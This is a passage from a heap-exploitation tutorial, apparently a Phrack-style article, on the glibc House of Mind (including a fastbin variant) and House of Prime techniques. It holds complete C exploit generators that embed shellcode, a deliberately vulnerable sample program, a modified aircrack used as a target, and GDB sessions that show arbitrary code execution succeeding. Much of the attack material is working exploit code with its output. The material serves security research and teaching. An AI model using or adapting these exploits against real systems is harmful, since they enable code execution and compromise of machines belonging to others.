    the address where we will find our &quot;fakearena&quot;, which is the
    address of the first chunk plus 8. The goal is jump garbage bytes
    that will be overwritten. 

7)  The &quot;prev_size&quot; field of &quot;p&quot; must be &quot;nop; nop; jmp 0x0c;&quot;. It will
    jump to our Shellcode when DTORS_END will be executed at the end of
    the application.

8)  The &quot;size&quot; field of &quot;p&quot; must be greater than the value written in
    &quot;av-&gt;max_fast&quot; and also have the NON_MAIN_ARENA bit activated
    which was the trigger for this whole story in The House of Mind.

9)  A few NOPS and then our Shellcode.

After understanding some very solid ideas, I was really surprised when a
simple execution of the K-sPecial's exploit produced the following output:

blackngel@linux:~$ ./exploit &gt; file
blackngel@linux:~$ ./heap1 &lt; file
ptr found at 0x804a008
good heap allignment found on malloc() 724 (0x81002a0)
*** glibc detected *** ./heap1: double free or corruption (out): 0x081002a0
...

In &quot;malloc.c&quot; this error corresponds to the integrity check:

   if (__builtin_expect (contiguous (av)

Let's go to see what happens with GDB:

[-----]

blackngel@linux:~$ gdb -q ./heap1
(gdb) disass main
Dump of assembler code for function main:
.....
.....
0x08048513 &lt;main+223&gt;:	call   0x804836c &lt;free@plt&gt;
0x08048518 &lt;main+228&gt;:	mov    -0x10(%ebp),%eax
0x0804851b &lt;main+231&gt;:	mov    %eax,(%esp)
0x0804851e &lt;main+234&gt;:	call   0x804836c &lt;free@plt&gt;
0x08048523 &lt;main+239&gt;:	mov    $0x0,%eax
0x08048528 &lt;main+244&gt;:	add    $0x34,%esp
0x0804852b &lt;main+247&gt;:	pop    %ecx
0x0804852c &lt;main+248&gt;:	pop    %ebp
0x0804852d &lt;main+249&gt;:	lea    -0x4(%ecx),%esp
0x08048530 &lt;main+252&gt;:	ret    
End of assembler dump.
(gdb) break *main+223             /* Before first call to free() */
Breakpoint 1 at 0x8048513
(gdb) break *main+228             /* After first call to free()  */
Breakpoint 2 at 0x8048518
(gdb) run &lt; file
Starting program: /home/blackngel/heap1 &lt; file
ptr found at 0x804a008
good heap allignment found on malloc() 724 (0x81002a0)

Breakpoint 1, 0x08048513 in main ()
Current language:  auto; currently asm
(gdb) x/16x 0x0804a008
0x804a008:	0x41414141	0x41414141	0x00000000	0x00000102
0x804a018:	0x00000102	0x00000102	0x00000102	0x00000102
0x804a028:	0x00000102	0x00000102	0x00000102	0x08049648
0x804a038:	0x08049648	0x08049648	0x08049648	0x08049648
(gdb) c
Continuing.

Breakpoint 2, 0x08048518 in main ()
(gdb) x/16x 0x0804a008
0x804a008:	0xb7fb2190	0xb7fb2190	0x00000000	0x00000000
0x804a018:	0x00000102	0x00000102	0x00000102	0x00000102
0x804a028:	0x00000102	0x00000102	0x00000102	0x08049648
0x804a038:	0x08049648	0x08049648	0x08049648	0x08049648

[-----]

When the application stopped before the first free(), we can see our
buffer seems to be well formed: [A x 8] [0000] [102h x 8].

But once the first call to free () is completed, as we said, the first 8
bytes are trashed with memory addresses. Most surprising is that the
memory 0x0804a0010(av) + 4, is set to zero (0x00000000).

This position should be &quot;av-&gt;max_fast&quot;, which being zero and not having
NONCONTIGUOUS_BIT bit enabled, dumps the error above. This seems happens
with the following instructions:

   # define mutex_unlock(m)            (*(m) = 0)

... that is executed to the end of &quot;_int_free()&quot; with:

   (void *)mutex_unlock(&amp;ar_ptr-&gt;mutex);

Anyway, if someone puts a 0 for us. What happens if we do that ar_ptr
points to 0x0804a014?

(gdb) x/16x 0x0804a014
                // Mutex       // max_fast ?
0x804a014:	0x00000000	0x00000102	0x00000102	0x00000102
0x804a024:	0x00000102	0x00000102	0x00000102	0x00000102
0x804a034:	0x08049648	0x08049648	0x08049648	0x08049648
0x804a044:	0x08049648	0x08049648	0x08049648	0x08049648

So we can save 8 bytes of garbage in the exploit and the hardcoded value
of &quot;mutex&quot;, and leave to free () to do the rest for us.

[-----]

blackngel@mac:~$ gdb -q ./heap1
(gdb) run &lt; file
Starting program: /home/blackngel/heap1 &lt; file
ptr found at 0x804a008
good heap allignment found on malloc() 724 (0x81002a0)

Program received signal SIGSEGV, Segmentation fault.
0x081002b2 in ?? ()
(gdb) x/16x 0x08100298
0x8100298:	0x90900ceb	0x00000409	0x08049648	0x0804a044
0x81002a8:	0x00000000	0x00000000	0x5bf42474	0x5e137381
0x81002b8:	0x83426ac9	0xf4e2fceb	0xdb32c234	0x6f02af0c
0x81002c8:	0x2a8d403d	0x4202ba71	0x2b08e636	0x10894030
(gdb) 

[-----]

It seems that the second chunk &quot;p&quot;, again suffer the wrath of free().
PREV_SIZE field is OK, SIZE field is OK, but the 8 NOPS are trashed with
two memory addresses and 8 bytes NULL.

Note that after the call to &quot;unsorted_chunks()&quot;, we have two sentences
like these:

      p-&gt;bk = bck;
      p-&gt;fd = fwd;
	
It is clear that both pointers are overwritten with the address of the
previous and next chunks to our overflowed chunk &quot;p&quot;.

What happens if we place 16 NOPS?

[-----]
/*
 * K-sPecial exploit modified by blackngel
 */

#include &lt;stdio.h&gt;

/* linux_ia32_exec -  CMD=/usr/bin/id Size=72 Encoder=PexFnstenvSub
http://metasploit.com */
unsigned char scode[] =
&quot;\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e&quot;
&quot;\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f&quot;
&quot;\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10&quot;
&quot;\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26&quot;
&quot;\x5e\x9e\x39\xcb\xbf\x04\xea\x42&quot;;

int main (void) {

     int i, j;

   for (i = 0; i &lt; 44 / 4; i++)
          fwrite(&quot;\x02\x01\x00\x00&quot;, 4, 1, stdout); /* av-&gt;max_fast-12 */

   for (i = 0; i &lt; 984 / 4; i++)
          fwrite(&quot;\x48\x96\x04\x08&quot;, 4, 1, stdout); /* DTORS_END - 8   */

   for (i = 0; i &lt; 721; i++) {
          fwrite(&quot;\x09\x04\x00\x00&quot;, 4, 1, stdout); /* PRESERVE SIZE   */
          for (j = 0; j &lt; 1028; j++)
                  putchar(0x41);                    /* PADDING         */
   }
   fwrite(&quot;\x09\x04\x00\x00&quot;, 4, 1, stdout);

   for (i = 0; i &lt; (1024 / 4); i++)
          fwrite(&quot;\x14\xa0\x04\x08&quot;, 4, 1, stdout);

   fwrite(&quot;\xeb\x0c\x90\x90&quot;, 4, 1, stdout); /* prev_size -&gt; jump 0x0c */

   fwrite(&quot;\x0d\x04\x00\x00&quot;, 4, 1, stdout); /* size -&gt; NON_MAIN_ARENA */

   fwrite(&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot; \
          &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;, 16, 1, stdout);  /* NOPS */

   fwrite(scode, sizeof(scode), 1, stdout); /* SHELLCODE */

   return 0;
}

[-----]

blackngel@linux:~$ ./exploit &gt; file
blackngel@linux:~$ ./heap1 &lt; file
ptr found at 0x804a008
good heap allignment found on malloc() 724 (0x81002a0)
uid=1000(blackngel) gid=1000(blackngel) groups=4(adm),20(dialout),
24(cdrom),25(floppy),29(audio),30(dip),33(www-data),44(video),
46(plugdev),104(scanner),108(lpadmin),110(admin),115(netdev),
117(powerdev),1000(blackngel),1001(compiler)
blackngel@linux:~$ 

We have succeeded! Up to this point, you could think that the first of
conditions for The House of Mind (a piece of memory allocated in an
address like 0x08100000) seems impossible from a practical point of view.

But this must be considered again for two reasons:

   1) You can to allocate a big amount of memory.
   2) The user can control this amount.

Is that true?

Well, yes, if we go back in time. Even at the same vulnerability in
is_modified() function of CVS. We can see the function corresponding to
the command &quot;entry&quot; of that service:

[-----]

 static void serve_entry (arg)
       char *arg;
 {
     struct an_entry *p; char *cp;

     [...]
     cp = arg;
     [...]
     p = xmalloc (sizeof (struct an_entry));
     cp = xmalloc (strlen (arg) + 2); strcpy (cp, arg); p-&gt;next = entries;
     p-&gt;entry = cp;
     entries = p;
 }

[-----]

How vl4d1m1r said, the heap layout will looked something like this:

   [an_entry][buffer][an_entry][buffer]...[Wilderness]

These chunks will not be free()ed until the function
server_write_entries() is called with the &quot;noop&quot; command. Note that in
addition to controlling the number of allocated chunks, you can control
the length too.

You can find this theory much better explained in the article &quot;The Art of
Exploitation: Come on back to exploit [10] published by vl4d1m1r of
Ac1dB1tch3z in Phrack 64.

The old exploit used the technique unlink () to accomplish its purpose.
This was for the glibc versions where this feature was not yet patched.

I'm not saying that The House of Mind is applicable to this vulnerability,
but rather that meets certain conditions. It would be an exercise for the
more advanced reader.

I have checked this House in a Linux distro with GLIBC 2.8.90.

We arrived, after a long journey, to The House of Mind.



                  &lt;&lt; Si el unico instrumento de que se
                     dispone es un martillo, todo acaba
                     pareciendo un clavo. &gt;&gt;

                                        [ Lotfi Zadeh ]



               --------------------
---[ 4.1.1 ---[   FASTBIN METHOD   ]---
               --------------------

As a new technique, I established in this paper a practical solution to
&quot;Fastbin method&quot; in The House of Mind, which was only exposed of
theoretical mode in the papers of Phantasmal and K-sPecial, and also
contained certain elements which were wrongly interpreted.

Both, K-special and Phantasmal said practically the same in their
documents about this method. The basic idea was to trigger following code:

[-----]

  if ((unsigned long)(size) &lt;= (unsigned long)(av-&gt;max_fast)) {
   if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     &gt;= av-&gt;system_mem, 0))
      {
	errstr = &quot;free(): invalid next size (fast)&quot;;
	goto errout;
      }

    set_fastchunks(av);
    fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);
    if (__builtin_expect (*fb == p, 0))
      {
	errstr = &quot;double free or corruption (fasttop)&quot;;
	goto errout;
      }
    printf(&quot;\nbDebug: p = 0x%x - fb = 0x%x\n&quot;, p, fb);
    p-&gt;fd = *fb;
    *fb = p;
  }

[-----]
	
As this code is located after the first integrity check in &quot;_int_free()&quot;,
the main advantage is that we should not worry about the following tests. 
This may appear to be a task easier than previous method, but in reality
it is not.

The core of this technique is in place &quot;fb&quot; to the address of an entry of
&quot;.dtors&quot; or &quot;GOT&quot;. Thanks to &quot;The House of Prime&quot; (first house discussed
in Malloc Maleficarum), we know how to accomplish this.

If we hack the &quot;size&quot; field of the overflowed chunk passed to free() and
sets it to 8, &quot;fastbin_index()&quot; returned the following value:

   #define fastbin_index(sz) ((((unsigned int)(sz)) &gt;&gt; 3) - 2)

   (8 &gt;&gt; 3) - 2 = -1

Then:

   &amp;(av-&gt;fastbins[-1])

And as in an arena structure (malloc_state) the previous item to
fastbins[] matrix is &quot;av-&gt;maxfast&quot; (they are contiguous), the address
where is this value will be placed in &quot;fb&quot;.

In &quot;*fb = p&quot;, the content of this address will be overwritten with the
address of the liberated chunk &quot;p&quot;, which as before should must contain
a &quot;JMP&quot; sentence to reach the Shellcode.

Seen this, if you want to use &quot;.dtors&quot;, you should make that &quot;ar_ptr&quot;
points to &quot;.dtors&quot; address in &quot;public_free()&quot;, so that this address will
be the fakearena and &quot;av-&gt;max_fast (av + 4)&quot; will be equal to &quot;.dtors +
4&quot;.  Then it will be overwritten with the address of &quot;p&quot;.

But to achieve this you have to go through a hard path. Let's see the
conditions that we must meet:

   1) The size of chunk must be less than &quot;av-&gt;maxfast&quot;:

   if ((unsigned long)(size) &lt;= (unsigned long)(av-&gt;max_fast))

   This is relatively the easiest, because we said that the size will be
   equal to &quot;8&quot; and &quot;av-&gt;max_fast&quot; will be the address of a destructor.
   It should be clear that in this case &quot;DTORS_END&quot; is not valid because
   it is always &quot;\x00\x00\x00\x00&quot; and never will be greater than &quot;size&quot;.
   It seems then that the most effective is to make use of the Global
   Offset Table (GOT).

   We must be aware that we say that &quot;size&quot; must be 8, but in order to
   modify &quot;ar_ptr&quot;, as in the previous technique, then NON_MAIN_ARENA bit
   (third least significant bit) must be set. So, I think, &quot;size&quot; should
   actually be:

      8 = 1000b | 100b = 4 | 8 + NON_MAIN_ARENA = 12 = [0x0c]

      With PREV_INUSE bit set: 1101b = [0x0d] 


   2) The size of contiguous chunk (next chunk) to &quot;p&quot; must be greater
      than &quot;8&quot;:

   __builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)

   This is no problem, right?

   3) The same chunk, at time, must be less than &quot;av-&gt;system_mem&quot;:

   __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)

	
   This is perhaps the most complicated step. Once established ar_ptr(av)
   in &quot;.dtors&quot; or &quot;GOT&quot;, the &quot;system_mem&quot; item in &quot;malloc_state&quot; structure
   is beyond 1848 bytes.

   GOT is almost contiguous to DTORS. In small applications the GOT table
   also is relatively small. For this reason it is normal to find in the
   av-&gt;system_mem position a lot of zero bytes. Let's see:

   [-----]

   blackngel@linux:~$ objdump -s -j .dtors ./heap1
   ...
   Contents of section .dtors:
   8049650 ffffffff 00000000
                    ........        
   blackngel@mac:~$ gdb -q ./heap1
   (gdb) break main
   Breakpoint 1 at 0x8048442
   (gdb) run &lt; file
   ...
   Breakpoint 1, 0x08048442 in main ()
   (gdb) x/8x 0x08049650
   0x8049650 &lt;__DTOR_LIST__&gt;: 0xffffffff 0x00000000 0x00000000 0x00000001
   0x8049660 &lt;_DYNAMIC+4&gt;:    0x00000010 0x0000000c 0x0804830c 0x0000000d
   (gdb) x/8x 0x08049650 + 1848
   0x8049d88: 0x00000000   0x00000000   0x00000000   0x00000000
   0x8049d98: 0x00000000   0x00000000   0x00000000   0x00000000 

   [-----]

   This technique appears to be only apply to large programs. Unless,
   as Phantasmal said, we can use the stack. How?

   If &quot;ar_ptr&quot; is set to EBP address in a function, then &quot;av-&gt;max_fast&quot;
   will be EIP, which may be overwritten with the address of the chunk
   &quot;p&quot;, and you already know how continues.

Here is ended the theory presented in the two mentioned papers. But
unfortunately there is something that they forgot... at least it is
something that quite surprised me from K-sPecial.

We learned about the previous attack, that &quot;av-&gt;mutex&quot;, which is the first
item in an &quot;arena&quot; structure, should be equal to 0. K-special, warned us
that otherwise, &quot;free()&quot; would remain in an infinite loop...

What about DTORS then?

&quot;.dtors&quot; will be always &quot;0xffffffff&quot;, otherwise it will be a destructor
address, but never 0.

You can find &quot;0x00000000&quot; four bytes behind of .dtors, but overwrite
&quot;0xffffffff&quot; has no effect.

What happens then with GOT?

I do not think that you can found 0x00000000 values between each item
within the GOT.

Solutions?

&gt;From the beginning, I only explored one possible solution:

The main goal would be to use the stack, as mentioned earlier. But the
difference is that we should have a buffer overflow before that allow
overwrite EBP with 0 bytes, so we have:

   EBP = av-&gt;mutex = 0x00000000
   EIP = av-&gt;max_fast = &amp;(p)
   *p     = &quot;jmp 0x0c&quot;
   *p + 4 = 0x0c o 0x0d
   *p + 8 = NOPS + SHELLCODE 

But a little magic can do wonders...


----------------
 FINAL SOLUTION
----------------

Phantasmal and K-sPecial thought to use only &quot;av-&gt;maxfast&quot; to overwrite
then this memory location with the address of the chunk &quot;p&quot;.

But because we control the entire arena &quot;av&quot;, can we afford make a new
analysis of &quot;fastbin_index()&quot; for a size argument of 16 bytes:

   (16 &gt;&gt; 3) - 2 = 0

So we obtain: fb = &amp;(av-&gt;fastbins [0]), and if we get this, we can
use the stack to overwrite EIP. How?

If our vulnerable code is into fvuln() function, EBP and EIP will be
pushed in the stack at the prologue, and what there is behind EBP? If no
user data then usually you can find a &quot;0x00000000&quot; value. If we use
&quot;av-&gt;fastbins[0]&quot; and not &quot;av-&gt;maxfast&quot;, we have the following:

   [ 0xRAND_VAL ]  &lt;-&gt;  av + 1848 = av-&gt;system_mem
    ............
   [     EIP    ]  &lt;-&gt;  av-&gt;fastbins[0]
   [     EBP    ]  &lt;-&gt;  av-&gt;max_fast
   [ 0x00000000 ]  &lt;-&gt;  av-&gt;mutex

	
In &quot;av + 1848&quot; is normal to find addresses or random values for
&quot;av-&gt;system_mem&quot; and so we can pass the checks to reach the final
code of &quot;fastbin&quot;.

The &quot;size&quot; field of &quot;p&quot; must be 16 with NON_MAIN_ARENA and PREV_INUSE
bits enabled. Then:

   16 = 10000 | NON_MAIN_ARENA and PREV_INUSE = 101 | SIZE = 10101 = 0x15h

	
And we can control the &quot;size&quot; field of the next chunk to be greater than
&quot;8&quot; and less than &quot;av-&gt;system_mem&quot;. If you look at the code above you will
note that this field is calculated from the offset of &quot;p&quot;, therefore,
this field is virtually in &quot;p + 0x15&quot;, which is an offset of 21 bytes.

If we write a value of &quot;0x09&quot; in that position it will be perfect.

But this value will be in the middle of our NOPS filler and we should make
a small change in the &quot;JMP&quot; sentence in order to jump farthest. Something
like 16 bytes will be sufficient.

For the Proof of Concept, I modified &quot;aircrack-2.41&quot; adding in main() the
following code:

[-----]

  int fvuln()
  {
       // Make something stupid here.
  }

   int main( int argc, char *argv[] )
   {
       int i, n, ret;
       char *s, buf[128];
       struct AP_info *ap_cur;

       fvuln();
   ...

[-----]

The next code exploit the vulnerability:

[-----]

/*
 * FastBin Method - exploit
 */

#include &lt;stdio.h&gt;

/* linux_ia32_exec -  CMD=/usr/bin/id Size=72 Encoder=PexFnstenvSub 
http://metasploit.com */
unsigned char scode[] =
&quot;\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e&quot;
&quot;\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f&quot;
&quot;\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10&quot;
&quot;\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26&quot;
&quot;\x5e\x9e\x39\xcb\xbf\x04\xea\x42&quot;;

int main (void) {

        int i, j;

        for (i = 0; i &lt; 1028; i++)                            /* FILLER  */
                putchar(0x41);

        for (i = 0; i &lt; 518; i++) {
                fwrite(&quot;\x09\x04\x00\x00&quot;, 4, 1, stdout);
                for (j = 0; j &lt; 1028; j++)
                        putchar(0x41);
        }
        fwrite(&quot;\x09\x04\x00\x00&quot;, 4, 1, stdout);

        for (i = 0; i &lt; (1024 / 4); i++)
                fwrite(&quot;\x34\xf4\xff\xbf&quot;, 4, 1, stdout);    /*  EBP - 4 */

        fwrite(&quot;\xeb\x16\x90\x90&quot;, 4, 1, stdout);            /* JMP 0x16 */

        fwrite(&quot;\x15\x00\x00\x00&quot;, 4, 1, stdout);  /* 16 + N_M_A + P_INU */
        
        fwrite(&quot;\x90\x90\x90\x90&quot; \
               &quot;\x90\x90\x90\x90&quot; \
               &quot;\x90\x90\x90\x90&quot; \
               &quot;\x09\x00\x00\x00&quot; \                   /* nextchunk-&gt;size */
               &quot;\x90\x90\x90\x90&quot;, 20, 1, stdout);
                       

        fwrite(scode, sizeof(scode), 1, stdout);      /* THE MAGIC CODE  */

        return(0);
}

[-----]

Let's now see it in action:

[-----]

blackngel@linux:~$ gcc ploit1.c -o ploit
blackngel@linux:~$ ./ploit &gt; file
blackngel@linux:~$ gdb -q ./aircrack

(gdb) disass fvuln
Dump of assembler code for function fvuln:
.........
.........
0x08049298 &lt;fvuln+184&gt;:	call   0x8048d4c &lt;free@plt&gt;
0x0804929d &lt;fvuln+189&gt;:	movl   $0x8056063,(%esp)
0x080492a4 &lt;fvuln+196&gt;:	call   0x8048e8c &lt;puts@plt&gt;
0x080492a9 &lt;fvuln+201&gt;:	mov    %esi,(%esp)
0x080492ac &lt;fvuln+204&gt;:	call   0x8048d4c &lt;free@plt&gt;
0x080492b1 &lt;fvuln+209&gt;:	movl   $0x8056075,(%esp)
0x080492b8 &lt;fvuln+216&gt;:	call   0x8048e8c &lt;puts@plt&gt;
0x080492bd &lt;fvuln+221&gt;:	add    $0x1c,%esp
0x080492c0 &lt;fvuln+224&gt;:	xor    %eax,%eax
0x080492c2 &lt;fvuln+226&gt;:	pop    %ebx
0x080492c3 &lt;fvuln+227&gt;:	pop    %esi
0x080492c4 &lt;fvuln+228&gt;:	pop    %edi
0x080492c5 &lt;fvuln+229&gt;:	pop    %ebp
0x080492c6 &lt;fvuln+230&gt;:	ret    
End of assembler dump.

(gdb) break *fvuln+204                         /* Before second free() */
Breakpoint 1 at 0x80492ac: file linux/aircrack.c, line 2302.

(gdb) break *fvuln+209                         /* After second free() */
Breakpoint 2 at 0x80492b1: file linux/aircrack.c, line 2303.

(gdb) run &lt; file
Starting program: /home/blackngel/aircrack &lt; file
[Thread debugging using libthread_db enabled]
ptr found at 0x807d008
good heap allignment found on malloc() 521 (0x8100048)

END fread()                 /* tests when free () freezing (mutex != 0) */
                        
END first free()            /* tests when free () freezing (mutex != 0) */
[New Thread 0xb7e5b6b0 (LWP 8312)]
[Switching to Thread 0xb7e5b6b0 (LWP 8312)]

Breakpoint 1, 0x080492ac in fvuln () at linux/aircrack.c:2302
warning: Source file is more recent than executable.
2302	        free(ptr2);

/* STACK DUMP */
(gdb) x/4x 0xbffff434    // av-&gt;max_fast // av-&gt;fastbins[0]
0xbffff434:   0x00000000     0xbffff518     0x0804ce52     0x080483ec

(gdb) x/x 0xbffff434 + 1848  /* av-&gt;system_mem */
0xbffffb6c:	0x3d766d77

(gdb) x/4x 0x08100048-8+20   /* nextchunk-&gt;size */
0x8100054:  0x00000009   0x90909090   0xe983c931   0xd9eed9f4
(gdb) c
Continuing.

Breakpoint 2, fvuln () at linux/aircrack.c:2303
2303	        printf(&quot;\nEND second free()\n&quot;);

(gdb) x/4x 0xbffff434                 // EIP = &amp;(p)
0xbffff434:  0x00000000   0xbffff518   0x08100040   0x080483ec
(gdb) c
Continuing.

END second free()
[New process 8312]
uid=1000(blackngel) gid=1000(blackngel) groups=4(adm),20(dialout),
24(cdrom),25(floppy),29(audio),30(dip),33(www-data),44(video),
46(plugdev),104(scanner),108(lpadmin),110(admin),115(netdev),
117(powerdev),1000(blackngel),1001(compiler)

Program exited normally.

[-----]

The advantage of this method is that it does not touch at any time the EBP
register, and thus we can skip some protection to BoF.

It is also noteworthy that the two methods presented here, in The House of
Mind, are still applicable in the most recent versions of glibc, I have
checked it with the latest version of GLIBC 2.8.90.

This time we have arrived, walking with lead foot and after a long
journey, to The House of Mind.



                 &lt;&lt; Solo existen 10 tipos de personas: los que
                    saben binario y los que no. &gt;&gt;

                                                       [ XXX ]



               -----------------------
---[ 4.1.2 ---[   av-&gt;top NIGHTMARE   ]---
               -----------------------

Once I had completed the study of The House of Mind, tracking down a
little more code in search of other possible attack vectors, I found
something like this at _int_free ():

[-----]

    /*
      If the chunk borders the current high end of memory,
      consolidate into top
    */

    else {
      size += nextsize;
      set_head(p, size | PREV_INUSE);
      av-&gt;top = p;
      check_chunk(av, p);
    }

[-----]

Since we control the arena &quot;av&quot;, we could place it in a certain location
of the stack, such that av-&gt;top coincide exactly with a saved EIP.

At this point, EIP would be overwritten with the address of our chunk &quot;p&quot;
overflowed. Then one arbitrary code execution could be triggered.

But my intentions were soon frustrated. To achieve execution of this code,
in a controlled environment, we should meet one impossible condition:

    if (nextchunk != av-&gt;top) {
       ...
    }

This only happens when the chunk &quot;p&quot; that will be free()ed, is contiguous
to the highest chunk, the Wilderness.

At some point you might think that you control the value of av-&gt;top, but
remember that once you place av in the stack, the control is passed to
random values in memory, and the current value of EIP never will be equal
to &quot;nextchunk&quot; unless it is possible one classic stack-overflow, then I
don't know that you do reading this article...

That I just want to prove, that for better or for worse, all possible ways
should be examined carefully.



                    &lt;&lt; Hasta ahora las masas han ido
                       siempre tras el hechizo. &gt;&gt;

                                      [ K. Jaspers ]



             ------------------------
---[ 4.2 ---[   THE HOUSE OF PRIME   ]---
             ------------------------
	
Thus seen to date, I do not want to dwell too much. The House of Prime is,
unquestionably, one of the most elaborated techniques in Malloc
Maleficarum . The result of a virtual adept.

However, as mentioned Phantasmal well, it is the least useful of all them
at first. While bearing in mind that The House of Mind requires a chunk of
memory located in 0x08100000, this should not be left aside.

To perform this technique will be needed tow calls to free() over two
chunks of memory that should be under designer's control, and one future
call to &quot;malloc ()&quot;.

The goal here, it sould be clear, it is not overwrite any memory address
(even if it's necessary to completion of the technique), but make that
one call to &quot;malloc()&quot; returns an arbitrary memory address. Then, if we
can control this area doing that it will fall in the stack, we could take
total control of application.

A final requirement is that the designer must control what is written in
this allocated chunk, so if we put it on the stack, relatively close to
EIP, this register can be overwritten with a arbitrary value. And you
already know as follows...

Let's see a vulnerable program:

[-----]

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

void fvuln(char *str1, char *str2, int age)
{
   int local_age;
   char buffer[64];
   char *ptr = malloc(1024);
   char *ptr1 = malloc(1024);
   char *ptr2 = malloc(1024);
   char *ptr3;

   local_age = age;
   strncpy(buffer, str1, sizeof(buffer)-1);

   printf(&quot;\nptr found at [ %p ]&quot;, ptr);
   printf(&quot;\nptr1ovf found at [ %p ]&quot;, ptr1);
   printf(&quot;\nptr2ovf found at [ %p ]\n&quot;, ptr2);

   printf(&quot;Enter a description: &quot;);
   fread(ptr, 1024 * 5, 1, stdin); 

   free(ptr1);
   printf(&quot;\nEND free(1)\n&quot;);
   free(ptr2);
   printf(&quot;\nEND free(2)\n&quot;);

   ptr3 = malloc(1024);
   printf(&quot;\nEND malloc()\n&quot;);
   strncpy(ptr3, str2, 1024-1);

   printf(&quot;Your name is %s and you are %d&quot;, buffer, local_age);
}

int main(int argc, char *argv[])
{
   if(argc &lt; 4) {
      printf(&quot;Usage: ./hop name last-name age&quot;);
      exit(0);
   }

   fvuln(argv[1], argv[2], atoi(argv[3]));

   return 0;
}


[-----]

To start, we need to control the header of a first chunk that will be
passed to free(), so that when we trigger a first call to &quot;free()&quot;, the
same code that in the &quot;FastBin Method&quot; will be used, but this time the
size field of the chunk has to be &quot;8&quot;, and obtain:

   fastbin_index(8) ((((unsigned int)(8)) &gt;&gt; 3) - 2) = -1

Then:

   fb = &amp;(av-&gt;fastbins[-1]) = &amp;av-&gt;max_fast;

In the last sentence: (*fb = p), av-&gt; max_fast will be overwritten with
the address of our chunk being free()'d.

The result is very evident, from that moment we can run the same piece of
code in free() whenever the size of chunk that will be passed to free()
is less than the value of the chunk address &quot;p&quot; previously free()'d.

Typically: av-&gt;max_fast = 0x00000048, and now is 0x080YYYYY. What is
more than you need.

To pass the integrity chesks of the first free() call, we need these
sizes:

chunk &quot;p&quot; -&gt; 8 (0x9h if PREV_INUSE bit is set).
nextchunk -&gt; 10h is a good value ( 8 &lt; &quot;0x10h&quot; &lt; av-&gt;system_mem )

So the exploit would start with something like this:

[-----]

int main (void) {

        int i, j;

        for (i = 0; i &lt; 1028; i++)                           /* FILLER */
                putchar(0x41);

        fwrite(&quot;\x09\x00\x00\x00&quot;, 4, 1, stdout); /* free(1) ptr1 size */
        fwrite(&quot;\x41\x41\x41\x41&quot;, 4, 1, stdout); /* FILLER */
        fwrite(&quot;\x10\x00\x00\x00&quot;, 4, 1, stdout); /* free(1) ptr2 size */

[-----]

The next mission is to overwrite the value of &quot;arena_key&quot; (read Malloc
Maleficarum for details) which is typically above &quot;av&quot; (&amp;main_arena).

As we can use chunks of very large sizes, we can make that
&amp;(av-&gt;fastbins[x]) points very far. At least enough to reach the
value of &quot;arena_key&quot; and overwrite it with the &quot;p&quot; address.

Taking the example of Phantasmal, we would have to resize the second chunk
to with the next value:

   1156 bytes / 4 = 289
   (289 + 2) &lt;&lt; 3 = 2328 = 0x918h -&gt; 0x919 (PREV_INUSE)
                           ------

You have to check again the &quot;size&quot; field of the next chunk, whose address
is calculated from the value that we obtain a moment ago.

You can continue your exploit:

[-----]

        for (i = 0; i &lt; 1020; i++)
                putchar(0x41);
        fwrite(&quot;\x19\x09\x00\x00&quot;, 4, 1, stdout); /* free(2) ptr2 size */

        .... /* Later */

        for (i = 0; i &lt; (2000 / 4); i++)
                fwrite(&quot;\x10\x00\x00\x00&quot;, 4, 1, stdout);

[-----]

At the end of the second free (): arena_key = p2.

This value will be used by the call to malloc () setting it as the &quot;arena&quot;
structure to use.

    arena_get(ar_ptr, bytes);
    if(!ar_ptr)
      return 0;
    victim = _int_malloc(ar_ptr, bytes);

Again, let's go to see, to be more intuitive, the magic code of
&quot;_int_malloc()&quot; function:

    .....

    if ((unsigned long)(nb) &lt;= (unsigned long)(av-&gt;max_fast)) {
      long int idx = fastbin_index(nb);
      fb = &amp;(av-&gt;fastbins[idx]);
      if ( (victim = *fb) != 0) {
        if (fastbin_index (chunksize (victim)) != idx)
          malloc_printerr (check_action, &quot;malloc(): memory&quot;
            &quot; corruption (fast)&quot;, chunk2mem (victim));
        *fb = victim-&gt;fd;
        check_remalloced_chunk(av, victim, nb);
        return chunk2mem(victim);
      }

    .....

&quot;av&quot; is now our arena, which starts at the beginning of the second chunk
liberated &quot;p2&quot;, then it is clear that &quot;av-&gt;max_fast&quot; will be equal to the
&quot;size&quot; field of the chunk. In order to pass the first integrity check, we
have to ensure that the size requested by the &quot;malloc()&quot; call is less than
that value, as Phantasmal said, otherwise you can try the technique
described in 4.2.1.

As our vulnerable program allocate 1024 bytes, it will be perfect por a
successful exploitation.

Then we can see that &quot;fb&quot; is set to address of a &quot;fastbin&quot; in &quot;av&quot;, and in
the following sentence, its content will be the final address of &quot;victim&quot;.
Remember that our goal is to allocate an amount of bytes into a place of
our choice.

Do you remember / * Later * / ?

Well, that is where we need to copy repeatedly the address that we want
in the stack, so any return &quot;fastbin&quot; set our address in &quot;fb&quot;.

Mmmmm, but wait a moment, the next condition is the most important:

   if (fastbin_index (chunksize (victim)) != idx)

This means that the &quot;size&quot; field of our fakechunk must be equal to the
amount requested by &quot;malloc()&quot;. This is the last requirement in The House
